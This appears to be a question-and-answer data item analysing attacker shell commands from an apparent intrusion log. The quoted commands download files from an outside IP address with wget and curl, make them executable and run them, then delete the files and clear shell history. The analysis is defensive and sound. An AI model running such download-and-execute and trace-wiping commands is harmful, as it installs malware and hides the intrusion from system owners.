{"Briefly explain the commands used in the attack.": "The attacker executed a series of commands during the attack. Here is a brief explanation of each command:\n\n1. `/bin/eyshcjdmzg`: The nature of this command is unclear; it appears to be an attempt to execute a binary or script with a non-standard name, which may be an obfuscated or encoded command name, or a file that was previously uploaded by the attacker.\n\n2. **Shell script commands**:\n   - `wget http://43.249.172.195:888/112`: Uses `wget` to download a file named `112` from the specified URL and port.\n   - `curl -O http://43.249.172.195:888/112`: Alternative to `wget`, used `curl` to download the same file.\n   - `chmod +x 112`: Makes the downloaded file `112` executable.\n   - `./112`: Executes the file named `112`.\n   - Similar steps (`wget`, `curl`, `chmod`, and execution) are repeated for another file named `112s`.\n   - `rm -rf 112.sh`, `rm -rf 112`, `rm -rf 112s`: Deletes the script file `112.sh` and the downloaded files `112` and `112s` to clean up and possibly avoid detection.\n   - `history -c`: Clears the command history of the shell session to obfuscate the attacker's actions.\n\n3. `ls -la /var/run/gcc.pid`: Lists the details of the file `gcc.pid` in the `/var/run` directory. This command seems to be checking for the existence of a specific process identifier (PID) file, potentially related to the attacker's own processes or to check the status of a compromised system.\n\nThe sequence of commands shows a clear pattern of downloading and executing potentially malicious files, then attempting to remove traces of the activity. It suggests the intentions to infect the system with malware, ensure the execution of that malware, and then cover the forensic traces of the attack."}
